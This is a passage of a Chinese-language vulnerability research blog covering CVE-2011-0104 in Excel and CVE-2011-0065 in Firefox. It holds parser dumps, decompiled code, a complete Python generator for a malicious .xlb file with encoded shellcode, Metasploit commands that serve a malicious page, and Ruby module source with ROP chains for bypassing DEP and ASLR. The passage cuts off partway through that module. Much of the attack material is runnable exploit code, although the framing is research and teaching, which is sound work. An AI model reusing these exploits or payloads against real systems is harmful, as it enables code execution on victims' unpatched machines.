and 2008 for Mac, Office for Mac 2011\n\n\nXLB 文件.xlb 文件是 Microsoft Excel 用于存储工具栏自定义设置的二进制文件。它的文件结构并未公开，因此没有官方的详细文档描述其内部结构，但 Microsoft 提供了包括 .xlsb 文件在内的其它文件的文件结构的介绍。这些文件结构信息可以通过逆向工程手段获取，也可以使用一些已有的解析工具解析得到。使用 py-office-tools 对样本 exploit.xlb 进行解析能够得到形如以下格式的解析结果\n[*]Opening file exploit.xlb[*]Listing streams/storages:Warning: OLE type 0x8 not in types[**]Detected Excel file exploit.xlb********************************************************************************[*]Dumping Workbook stream 0x3f7a (16250) bytes...[ii]BOF record: current count 1...[7]Record FORMAT [0x41e (1054)] offset 0x4cd (1229), len 0x2e (46) (Number Format)        WORD ifmt = 0x29 (41)        WORD cch = 0x29 (41)        BYTE grbit = 0x0 (0)        Field &#x27;rgb&#x27; is variable length, dumping rest of record:            0000000000   5F 28 2A 20 23 2C 23 23 30 5F 29 3B 5F 28 2A 20    _(* #,##0_);_(*             0000000010   5C 28 23 2C 23 23 30 5C 29 3B 5F 28 2A 20 22 2D    .(#,##0.);_(* &quot;-            0000000020   22 5F 29 3B 5F 28 40 5F 29                         &quot;_);_(@_)...\n\n这样的 Rocord 共有 457 条，漏洞描述中提到的 TOOLBARDEF Record 是其中的第 2 条（偏移为1）\n[1]Record TOOLBARDEF [0xa7 (167)] offset 0x14 (20), len 0x4 (4) (Toolbar Definition:)        BYTE fUnnamed = 0xb0 (176)        WORD cbtn = 0xc0f (3087)        Field &#x27;rgbbtndef&#x27; is variable length, dumping rest of record:            0000000000   00                                                 .[2]Record CONTINUE [0x3c (60)] offset 0x1c (28), len 0x300 (768) (Continues Long Records)        Field &#x27;data&#x27; is variable length, dumping rest of record:            0000000000   40 DF D6 D5 3B DF D6 D5 3B 00 00 00 00 00 00 00    @...;...;.......            0000000010   00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000020   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000030   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000040   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000050   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000060   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000070   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000080   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000090   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            00000000A0   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            00000000B0   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            00000000C0   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            00000000D0   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            00000000E0   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            00000000F0   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000100   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000110   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000120   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000130   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000140   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000150   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000160   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000170   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000180   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90    ................            0000000190   90 90 90 00 62 00 72 00 69 00 31 00 1E 00 DC 00    ....b.r.i.1.....            00000001A0   00 00 08 00 90 01 00 00 00 02 00 FA 07 01 43 00    ..............C.            00000001B0   61 00 6C 00 69 00 62 00 72 00 69 00 31 00 1E 00    a.l.i.b.r.i.1...            00000001C0   68 01 01 00 38 00 BC 02 00 00 00 02 00 FA 07 01    h...8...........            00000001D0   43 00 61 00 6D 00 62 00 72 00 69 00 61 00 31 00    C.a.m.b.r.i.a.1.            00000001E0   1E 00 2C 01 01 00 38 00 BC 02 00 00 00 02 00 FA    ..,...8.........            00000001F0   07 01 43 00 61 00 6C 00 69 00 62 00 72 00 69 00    ..C.a.l.i.b.r.i.            0000000200   31 00 1E 00 04 01 01 00 38 00 BC 02 00 00 00 02    1.......8.......            0000000210   00 FA 07 01 43 00 61 00 6C 00 69 00 62 00 72 00    ....C.a.l.i.b.r.            0000000220   69 00 31 00 1E 00 DC 00 01 00 38 00 BC 02 00 00    i.1.......8.....            0000000230   00 02 00 FA 07 01 43 00 61 00 6C 00 69 00 62 00    ......C.a.l.i.b.            0000000240   72 00 69 00 31 00 1E 00 DC 00 00 00 11 00 90 01    r.i.1...........            0000000250   00 00 00 02 00 FA 07 01 43 00 61 00 6C 00 69 00    ........C.a.l.i.            0000000260   62 00 72 00 69 00 31 00 1E 00 DC 00 00 00 14 00    b.r.i.1.........            0000000270   90 01 00 00 00 02 00 FA 07 01 43 00 61 00 6C 00    ..........C.a.l.            0000000280   69 00 62 00 72 00 69 00 31 00 1E 00 DC 00 00 00    i.b.r.i.1.......            0000000290   3C 00 90 01 00 00 00 02 00 FA 07 01 43 00 61 00    &lt;...........C.a.            00000002A0   6C 00 69 00 62 00 72 00 69 00 31 00 1E 00 DC 00    l.i.b.r.i.1.....            00000002B0   00 00 3E 00 90 01 00 00 00 02 00 FA 07 01 43 00    ..&gt;...........C.            00000002C0   61 00 6C 00 69 00 62 00 72 00 69 00 31 00 1E 00    a.l.i.b.r.i.1...            00000002D0   DC 00 01 00 3F 00 BC 02 00 00 00 02 00 FA 07 01    ....?...........            00000002E0   43 00 61 00 6C 00 69 00 62 00 72 00 69 00 31 00    C.a.l.i.b.r.i.1.            00000002F0   1E 00 DC 00 01 00 34 00 BC 02 00 00 00 02 00 FA    ......4.........WARNING:No record description for id 0x107 (263) len 0x43 (67)        0000000000   61 00 6C 00 69 00 62 00 72 00 69 00 31 00 1E 00    a.l.i.b.r.i.1...        0000000010   DC 00 00 00 34 00 90 01 00 00 00 02 00 FA 07 01    ....4...........        0000000020   43 00 61 00 6C 00 69 00 62 00 72 00 69 00 31 00    C.a.l.i.b.r.i.1.        0000000030   1E 00 DC 00 01 00 09 00 BC 02 00 00 00 02 00 FA    ................        0000000040   07 01 43                                           ..C!!Invalid record length (0x6c00, 27648) only have 0x3c0f (15375) left!!Attempting to recover from error!!Recovered from error, skipped 0xda (218) bytes\n\n注意到解析工具提醒我们紧跟在 TOOLBARDEF 后的 CONTINUE 仅有一个字段，且字段值非常大（0x300），同时其后出现了非法 Record\n\n结合漏洞描述很容易想到这里的 CONTINUE Record 就是溢出后的 Payload\n\n漏洞分析MSF 未收录该漏洞，故在此使用著名安全组织 Abysssec 提供的 Exploit 生成的样本 exploit.xlb 进行分析\n调试运行 excel.exe 并打开 exploit.xlb 将使得程序触发异常，并中断在函数 sub_300E05AD 的 0x300E06F7 处，对栈顶下内存写硬件断点，发现程序执行到了 sub_300DE7EC 函数的 0x300DE834 处，指令为 rep movsd，它将 esi 指向的数据复制到 edi 指向的内存，反编译该函数得到\nchar *__userpurge sub_300DE7EC@&lt;eax&gt;(char *a1@&lt;ebp&gt;, char *a2, unsigned int a3, unsigned int a4)&#123;  int v4; // ebx  int v5; // edx  signed int v6; // eax  signed int v7; // eax  int v9; // eax  v4 = a3;  if ( !a3 )    return 0;  if ( a3 &gt; a4 )  &#123;    sub_300DD5A6(dword_3088DF34, 6);    goto LABEL_15;  &#125;  v5 = dword_30892C44;  v6 = nNumberOfBytesToRead;  a1 = a2;  do  &#123;    if ( v5 &gt;= v6 )    &#123;      v9 = v4;      if ( v4 &gt; 0x4000 )LABEL_15:        v9 = 0x4000;      sub_3011A989(v9);      v5 = dword_30892C44;      v6 = nNumberOfBytesToRead;    &#125;    v7 = v6 - v5;    if ( v4 &lt; v7 )      v7 = v4;    qmemcpy(a1, (char *)dword_3088EC40 + v5, v7);    v4 -= v7;    v5 = v7 + dword_30892C44;    a1 += v7;    dword_30892C44 += v7;    if ( !v4 )      break;    v6 = nNumberOfBytesToRead;  &#125;  while ( nNumberOfBytesToRead == 0x4000 );  return (char *)(a1 - a2);&#125;\n\n注意到危险函数 memcpy，其复制长度为变量 v7，其值为 0x300（一个上文中出现过的数字）。对 v7 进行污点分析：\nv7 的值为 v4 与 v6 - v5 中的较小值，其中 v4 为传入的参数 a3，v5 和 v6 都来自于内存中存储的数据。根据平时软件开发的经验，我们更倾向于认为 v4 代表了需要 memcpy 的大小，而 v6 - v5 像是某种默认值或阈值。因此先追溯 v4。v4 的值来自于函数传入的参数 a3，a3 来自主调函数的 v74，v74 来自 v13，v13 的值来自于 sub_300DE7C5 函数的返回值\nint sub_300DE7C5()&#123;  signed int v0; // eax  int v1; // ecx  int result; // eax  int v3; // esi  int v4; // ecx  unsigned __int16 v5; // ax  v0 = nNumberOfBytesToRead;  v1 = dword_30892C44;  if ( dword_30892C44 &gt;= (int)(nNumberOfBytesToRead - 1) )  &#123;    if ( dword_30892C44 &gt;= (int)nNumberOfBytesToRead )    &#123;      sub_3011A989(1);      v1 = dword_30892C44;      v0 = nNumberOfBytesToRead;    &#125;    v3 = dword_3088EC40[v1];    v4 = v1 + 1;    dword_30892C44 = v4;    if ( v4 &gt;= v0 )    &#123;      sub_3011A989(1);      v4 = dword_30892C44;    &#125;    LOBYTE(v5) = 0;    HIBYTE(v5) = dword_3088EC40[v4];    dword_30892C44 = v4 + 1;    return v5 | v3;  &#125;  else  &#123;    result = *(unsigned __int16 *)&amp;dword_3088EC40[dword_30892C44];    dword_30892C44 += 2;  &#125;  return result;&#125;\n\n发现该函数应该是在从映射到内存中的文件流里读数据，并且读取了文件偏移 0x1C 处用 0x3C 表示的数据（由主调函数得出）。结合上文中对样本 XLB 文件的解析结果，不难得出 memcpy 的复制长度参数这一污点的来源是程序打开的 .xlb 文件中 CONTINUE RECORD 的 Len 字段。通过相同的方式污点分析 memcpy 的复制地址也来自于打开的 .xlb 文件，具体地说来自于 TOOLBARDEF RECORD 的 Len 字段与 cbtn 字段\n总结，通过调试威胁样本能够定位到漏洞函数 sub_300DE7EC，对漏洞函数进行污点分析后发现程序没有对来自 .xlb 文件的输入进行任何的过滤便直接基于读取到的数据进行 memcpy，进而导致了允许攻击者对任意地址写入任意大小数据的栈溢出漏洞的出现\n漏洞利用运行 exploit.py 程序修改 src.xlb 基础文件生成 exploit.xlb 木马文件（shellcode 是打开计算器）\npython exploit.py\n\nExploit 分析这是一个比较典型的栈溢出 exp，详见注释即可\n&#x27;&#x27;&#x27;# Full info : http://www.abysssec.com/blog/2011/11/02/microsoft-excel-2007-sp2-buffer-overwrite-vulnerability-ba-exploit-ms11-021/# Microsoft Office Excel 2007 SP2 Code Execution Exploit # Exploit for MS11-021 patch# Tested on Microsoft Office Excel 2007 (xp) SP2 (Excel.exe . Version = 12.0.6545.5000)&#x27;&#x27;&#x27;import sysdef main():       try:        #* 打开基础文件        fdR = open(&#x27;src.xlb&#x27;, &#x27;rb+&#x27;)        strTotal = fdR.read()        #* 修改了 0x33D / 829 字节        str1 = strTotal[:1556] #* 0x613        str2 = strTotal[2385:] #* 0x951                #* 构造 TOOLBARDEF Record        recordType = &quot;\\xA7\\x00&quot;        recordLenght = &quot;\\x04\\x00&quot;        field1 = &quot;\\xB0&quot;        field2 = &quot;\\x0F\\x0C&quot;        field3 = &quot;\\x00&quot;        field4 = &quot;\\x3C\\x00&quot;        field5 = &quot;\\x00\\x03&quot;                record = recordType + recordLenght + field1 + field2 + field3 + field4 + field5                #* Shellcode 地址，现在一般写成 ret_addr        eip = &quot;\\xDF\\xD6\\xD5\\x3B&quot;    # Call ESP                # shellcode calc.exe        shellcode = &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;        shellcode += &#x27;\\x89\\xE5\\xD9\\xEE\\xD9\\x75\\xF4\\x5E\\x56\\x59\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x51\\x5A\\x6A\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6B\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\\x75\\x4A\\x49\\x4B\\x4C\\x4B\\x58\\x51\\x54\\x43\\x30\\x43\\x30\\x45\\x50\\x4C\\x4B\\x51\\x55\\x47\\x4C\\x4C\\x4B\\x43\\x4C\\x43\\x35\\x44\\x38\\x45\\x51\\x4A\\x4F\\x4C\\x4B\\x50\\x4F\\x44\\x58\\x4C\\x4B\\x51\\x4F\\x47\\x50\\x45\\x51\\x4A\\x4B\\x51\\x59\\x4C\\x4B\\x46\\x54\\x4C\\x4B\\x43\\x31\\x4A\\x4E\\x46\\x51\\x49\\x50\\x4A\\x39\\x4E\\x4C\\x4C\\x44\\x49\\x50\\x42\\x54\\x45\\x57\\x49\\x51\\x48\\x4A\\x44\\x4D\\x45\\x51\\x49\\x52\\x4A\\x4B\\x4B\\x44\\x47\\x4B\\x46\\x34\\x46\\x44\\x45\\x54\\x43\\x45\\x4A\\x45\\x4C\\x4B\\x51\\x4F\\x47\\x54\\x43\\x31\\x4A\\x4B\\x43\\x56\\x4C\\x4B\\x44\\x4C\\x50\\x4B\\x4C\\x4B\\x51\\x4F\\x45\\x4C\\x45\\x51\\x4A\\x4B\\x4C\\x4B\\x45\\x4C\\x4C\\x4B\\x43\\x31\\x4A\\x4B\\x4C\\x49\\x51\\x4C\\x47\\x54\\x45\\x54\\x48\\x43\\x51\\x4F\\x46\\x51\\x4C\\x36\\x43\\x50\\x46\\x36\\x45\\x34\\x4C\\x4B\\x50\\x46\\x50\\x30\\x4C\\x4B\\x47\\x30\\x44\\x4C\\x4C\\x4B\\x44\\x30\\x45\\x4C\\x4E\\x4D\\x4C\\x4B\\x42\\x48\\x44\\x48\\x4D\\x59\\x4B\\x48\\x4B\\x33\\x49\\x50\\x43\\x5A\\x46\\x30\\x45\\x38\\x4C\\x30\\x4C\\x4A\\x45\\x54\\x51\\x4F\\x42\\x48\\x4D\\x48\\x4B\\x4E\\x4D\\x5A\\x44\\x4E\\x50\\x57\\x4B\\x4F\\x4A\\x47\\x43\\x53\\x47\\x4A\\x51\\x4C\\x50\\x57\\x51\\x59\\x50\\x4E\\x50\\x44\\x50\\x4F\\x46\\x37\\x50\\x53\\x51\\x4C\\x43\\x43\\x42\\x59\\x44\\x33\\x43\\x44\\x43\\x55\\x42\\x4D\\x50\\x33\\x50\\x32\\x51\\x4C\\x42\\x43\\x45\\x31\\x42\\x4C\\x42\\x43\\x46\\x4E\\x45\\x35\\x44\\x38\\x42\\x45\\x43\\x30\\x41\\x41&#x27;                                        if len(shellcode) &gt; 800:            print &quot;[*] Error : Shellcode length is long&quot;            return        if len(shellcode) &lt;= 800:            dif = 800 - len(shellcode)            #* 填充 Nop 雪橇            while dif &gt; 0 :                shellcode += &#x27;\\x90&#x27;                dif = dif - 1                        fdW= open(&#x27;exploit.xlb&#x27;, &#x27;wb+&#x27;)        fdW.write(str1)        fdW.write(record)            fdW.write(&quot;\\x41&quot;)     # pad        fdW.write(eip)                        fdW.write(&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;)      # bypassing a conditional        fdW.write(shellcode)        fdW.write(str2)                fdW.close()        fdR.close()        print &#x27;[-] Excel file generated&#x27;    except IOError:        print &#x27;[*] Error : An IO error has occurred&#x27;        print &#x27;[-] Exiting ...&#x27;        sys.exit(-1)                if __name__ == &#x27;__main__&#x27;:    main()\n\n漏洞修复对打补丁前后的程序进行 BinDiff 后发现漏洞函数的主调函数在调用前增加了一些判断条件以避免栈溢出的发生。有一说一闹麻了。\nReferenceNVD - CVE-2011-0104CVE - CVE-2011-0104Github - CVE-2011-0104漏洞战争Office FIle Formats\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2011-0065 漏洞研究","url":"/2025/03/03/Vulnerability%20Investigation/CVE-2011-0065%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"Mozilla Firefox 和 SeaMonkey 中的 mChannel 存在释放后重引用漏洞，其利用可导致任意代码执行\n影响范围：\nMozilla Firefox 1.0 - 3.5.18Mozilla Firefox 3.6 - 3.6.16Mozilla SeaMonkey 1.0 - 2.0.13\n漏洞分析开启 hpa 调试运行 Firefox.exe 并打开样本后触发 Access Violation 异常而崩溃。栈回溯发现崩溃时的主调函数基本都是 xul.dll 模块中的虚函数。崩溃时的指令位置是一片没什么意义的内存区域，因此先在调用栈的栈顶函数处下断点，到达后查看上下文指令后可根据 C++ 成员函数 this 指针调用约定推测出寄存器 eax为对象地址，其首部指向了虚表并被赋值给了寄存器 ecx，即寄存器 ecx 存储的值为虚表基地址。崩溃的发生原因为虚表基指针指向了无意义的内存区域。\n《漏洞战争》接下来的分析过程是，从 POC 中发现关键函数 onChannelRedirect，随后在 WinDBG 中搜索该函数，最终会得到不同类里大量的同名函数。在栈回溯结果中能够得到发生崩溃的函数所属的类，借此可以定位到函数 xul!nsObjectLoadingContent::onChannelRedirect。随后对其进行反汇编与静态代码分析。\n不过 Firefox 是开源的，直接阅读其对应源码即可（反汇编结果很抽象）\n// nsIChannelEventSinkNS_IMETHODIMPnsObjectLoadingContent::OnChannelRedirect(nsIChannel *aOldChannel,                                          nsIChannel *aNewChannel,                                          PRUint32    aFlags)&#123;  // If we&#x27;re already busy with a new load, cancel the redirect  if (aOldChannel != mChannel) &#123;    return NS_BINDING_ABORTED;  &#125;  if (mClassifier) &#123;    mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel);  &#125;  mChannel = aNewChannel; // Vulnerability  return NS_OK;&#125;\n\n在 onChannelRedirect 函数中，当 mChannel 对象未被分配时，将被临时赋予一个新对象值 aNewChannel。Firefox 采取的垃圾回收机制将会在函数调用完毕后回收不再使用的对象，因此函数实参(argument)，局部变量 aNewChannel 将会在函数返回后被垃圾回收，换而言之就是在 Vulnerability 处赋值符号左边的变量 mChannel 的生命周期大于赋值符号右边的变量 aNewChannel，这将导致在函数调用结束后 mChannel 成为悬挂指针\nnsresultnsObjectLoadingContent::LoadObject(nsIURI* aURI,                                   PRBool aNotify,                                   const nsCString&amp; aTypeHint,                                   PRBool aForceLoad)&#123;  ...  // From here on, we will always change the content. This means that a  // possibly-loading channel should be aborted.  if (mChannel) &#123;    LOG((&quot;OBJLC [%p]: Cancelling existing load\\n&quot;, this));    if (mClassifier) &#123;      mClassifier-&gt;Cancel();      mClassifier = nsnull;    &#125;    // These three statements are carefully ordered:    // - onStopRequest should get a channel whose status is the same as the    //   status argument    // - onStopRequest must get a non-null channel    mChannel-&gt;Cancel(NS_BINDING_ABORTED); // USE AFTER FREE    if (mFinalListener) &#123;      // NOTE: Since mFinalListener is only set in onStartRequest, which takes      // care of calling mFinalListener-&gt;OnStartRequest, mFinalListener is only      // non-null here if onStartRequest was already called.      mFinalListener-&gt;OnStopRequest(mChannel, nsnull, NS_BINDING_ABORTED);      mFinalListener = nsnull;    &#125;    mChannel = nsnull;  &#125;  ...  return NS_OK;&#125;\n\n随后，mChannel 将会在 xul!nsObjectLoadingContent::LoadObject 函数中被解引用，进而导致 UAF 漏洞。静态分析的结果可以被动态调试所证实，在 xul!nsObjectLoadingContent::LoadObject 函数处下断点后即可发现 UAF 处引用的对象与 xul!nsObjectLoadingContent::onChannelRedirect 一致，单步跟进后发现虚表指针被修改导致索引虚函数时出错并触发 Access Violation 异常程序崩溃\n要是用 Rust 编写就不会出现这样的漏洞了，令人感慨\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2011-0065\n\n搜索结果\nMatching Modules================   #  Name                                             Disclosure Date  Rank    Check  Description   -  ----                                             ---------------  ----    -----  -----------   0  exploit/osx/browser/mozilla_mchannel             2011-05-10       normal  No     Mozilla Firefox 3.6.16 mChannel Use-After-Free   1  exploit/windows/browser/mozilla_mchannel         2011-05-10       normal  No     Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability   2    \\_ target: Automatic                           .                .       .      .   3    \\_ target: Firefox 3.6.16 on Windows XP SP3    .                .       .      .   4    \\_ target: Firefox 3.6.16 on Windows 7 + Java  .                .       .      .Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/browser/mozilla_mchannelAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;Firefox 3.6.16 on Windows 7 + Java&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/mozilla_mchannelmsf6 exploit(windows/browser/mozilla_mchannel) &gt; info\n\n模块详情信息\n       Name: Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability     Module: exploit/windows/browser/mozilla_mchannel   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2011-05-10Provided by:  regenrecht  Rh0  mr_me &lt;steventhomasseeley@gmail.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   Automatic      1   Firefox 3.6.16 on Windows XP SP3      2   Firefox 3.6.16 on Windows 7 + JavaCheck supported:  NoBasic options:  Name     Current Setting  Required  Description  ----     ---------------  --------  -----------  SRVHOST  *******          yes       The local host or network interface to listen on. This must be an address on the local machine                                       or ******* to listen on all addresses.  SRVPORT  8080             yes       The local port to listen on.  SSL      false            no        Negotiate SSL for incoming connections  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)  URIPATH                   no        The URI to use for this exploit (default is random)Payload information:  Space: 1024Description:  This module exploits a use after free vulnerability in Mozilla  Firefox 3.6.16. An OBJECT Element mChannel can be freed via the  OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel  becomes a dangling pointer and can be reused when setting the OBJECTs  data attribute. (Discovered by regenrecht). This module uses heapspray  with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay,  a windows 7 target was provided using JAVA 6 and below to avoid aslr.References:  https://nvd.nist.gov/vuln/detail/CVE-2011-0065  OSVDB (72085)  https://bugzilla.mozilla.org/show_bug.cgi?id=634986  http://www.mozilla.org/security/announce/2011/mfsa2011-13.htmlView the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/mozilla_mchannel) &gt; set payload windows/execmsf6 exploit(windows/browser/mozilla_mchannel) &gt; set CMD calc.exemsf6 exploit(windows/browser/mozilla_mchannel) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其恶意 HTML 文件以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/browser/mozilla_mchannel.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::HttpServer::HTML  #include Msf::Exploit::Remote::BrowserAutopwn  #autopwn_info(&#123;  #  :ua_name =&gt; HttpClients::FF,  #  :ua_minver =&gt; &quot;3.6.16&quot;,  #  :ua_maxver =&gt; &quot;3.6.16&quot;,  #  :os_name =&gt; OperatingSystems::Match::WINDOWS,  #  :javascript =&gt; true,  #  :rank =&gt; NormalRanking,  #&#125;)  def initialize(info = &#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;           =&gt; &#x27;Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability&#x27;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;DefaultOptions&#x27; =&gt; &#123;...&#125;,      &#x27;Payload&#x27;        =&gt;        &#123;          &#x27;Space&#x27; =&gt; 1024,        &#125;,      &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,      &#x27;Targets&#x27;        =&gt;        [          [ &#x27;Automatic&#x27;, &#123; &#125; ],          # DEP bypass          [            &#x27;Firefox 3.6.16 on Windows XP SP3&#x27;,            &#123;              &#x27;Arch&#x27; =&gt; ARCH_X86,              &#x27;Fakevtable&#x27; =&gt; 0x0c00,              &#x27;Fakefunc&#x27; =&gt; 0x0c00001c,            &#125;          ],          # requires JAVA &lt;= JAVA 6 update 26          # cop stack pivot = ASLR/DEP bypass          [            &#x27;Firefox 3.6.16 on Windows 7 + Java&#x27;,            &#123;              &#x27;Arch&#x27; =&gt; ARCH_X86,              &#x27;Fakevtable&#x27; =&gt; 0x1000,              &#x27;Fakefunc&#x27; =&gt; 0x100002a4,              &#x27;Ppppr&#x27; =&gt; 0x7c3410c0,              &#x27;Retn&#x27; =&gt; 0x7c3410c4,            &#125;          ]        ],      &#x27;DefaultTarget&#x27;  =&gt; 0,      &#x27;DisclosureDate&#x27; =&gt; &#x27;2011-05-10&#x27;      ))  end  def junk    return rand_text_alpha(4).unpack(&quot;L&quot;)[0].to_i  end  def on_request_uri(cli, request)    # Random JavaScript variable names    js_element_name      = rand_text_alpha(rand(10) + 5)    js_obj_addr_name     = rand_text_alpha(rand(10) + 5)    js_sc_name           = rand_text_alpha(rand(10) + 5)    js_ret_addr_name     = rand_text_alpha(rand(10) + 5)    js_chunk_name        = rand_text_alpha(rand(10) + 5)    js_final_chunk_name  = rand_text_alpha(rand(10) + 5)    js_block_name        = rand_text_alpha(rand(10) + 5)    js_array_name        = rand_text_alpha(rand(10) + 5)    js_retns             = rand_text_alpha(rand(10) + 5)    js_applet_name       = rand_text_alpha(rand(10) + 5)    js_ppppr             = rand_text_alpha(rand(10) + 5)    js_filler            = rand_text_alpha(rand(10) + 5)    agent = request.headers[&#x27;User-Agent&#x27;]    # Set target manually or automatically    my_target = target    if my_target.name == &#x27;Automatic&#x27;      if agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/3\\.6\\.16/        my_target = targets[1]      elsif agent =~ /NT 6\\.1/ and agent =~ /Firefox\\/3\\.6\\.16/        my_target = targets[2]      end    end    # check for non vulnerable targets    if agent !~ /NT 5\\.1/ or agent !~ /NT 6\\.1/ and agent !~ /Firefox\\/3\\.6\\.16/      print_error(&quot;Target not supported: #&#123;agent&#125;&quot;)      send_not_found(cli)      return    end    # Re-generate the payload    return if ((p = regenerate_payload(cli).encoded) == nil)    if my_target.name =~ /Windows 7/ and not request.uri =~ /\\.html/      html_trigger = &quot;&quot;      if (&quot;/&quot; == get_resource[-1,1])        html_trigger = get_resource[0, get_resource.length - 1]      else        html_trigger = get_resource      end      custom_js = &lt;&lt;-JS      function forward() &#123;        window.location = window.location + &quot;#&#123;html_trigger&#125;.html&quot;;      &#125;      function start() &#123;        setTimeout(&quot;forward()&quot;, 3500);      &#125;      start();      JS    else      if my_target.name =~ /Windows XP/        # DEP bypass using xul.dll        rop_gadgets = [          0x1052c871,  # mov esp,[ecx] / mov edx,5c86c6ff / add [eax],eax / xor eax,eax / pop esi / retn 0x8 [xul.dll]          junk,        # junk --------------------------------------------------------------^^          0x7c801ad4,  # VirtualProtect          junk,        # junk -------------------------------------------------------------------------^^          junk,        # junk -------------------------------------------------------------------------^^          0x1003876B,  # jmp esp          0x0c000040,  # start address          0x00000400,  # size 1024          0x00000040,  # Page EXECUTE_READ_WRITE          0x0c0c0c00,  # old protection        ].pack(&quot;V*&quot;)        rop = rop_gadgets      elsif my_target.name =~ /Windows 7/ and request.uri =~ /\\.html/        # 5 gadgets to pivot using call oriented programming (cop)        # these instructions are taken from: java.dll, zip.dll and MSVCR71.dll (non aslr)        # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]        # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)        # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN        rop_pivot = [          0x6D32280C,  # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]          junk,        # filler          0x6D7E627D,  # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)          0x7C3413A4,  # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN        ].pack(&quot;V*&quot;)        # 319        # rop nops - RETN        rop_pivot &lt;&lt; [0x7c3410c4].pack(&quot;V*&quot;) * 0x65 #(0xca-0x65)        # POP r32 / RETN        rop_pivot &lt;&lt; [0x7c3410c3].pack(&quot;V*&quot;)        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]        rop_pivot &lt;&lt; [0x6D7E5CDA].pack(&quot;V*&quot;)        # rop nops - RETN        rop_pivot &lt;&lt; [0x7c3410c4].pack(&quot;V*&quot;) * 0xda # (0x75+0x65)        # POP r32 / RETN        rop_pivot &lt;&lt; [0x7c3410c3].pack(&quot;V*&quot;)        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]        rop_pivot 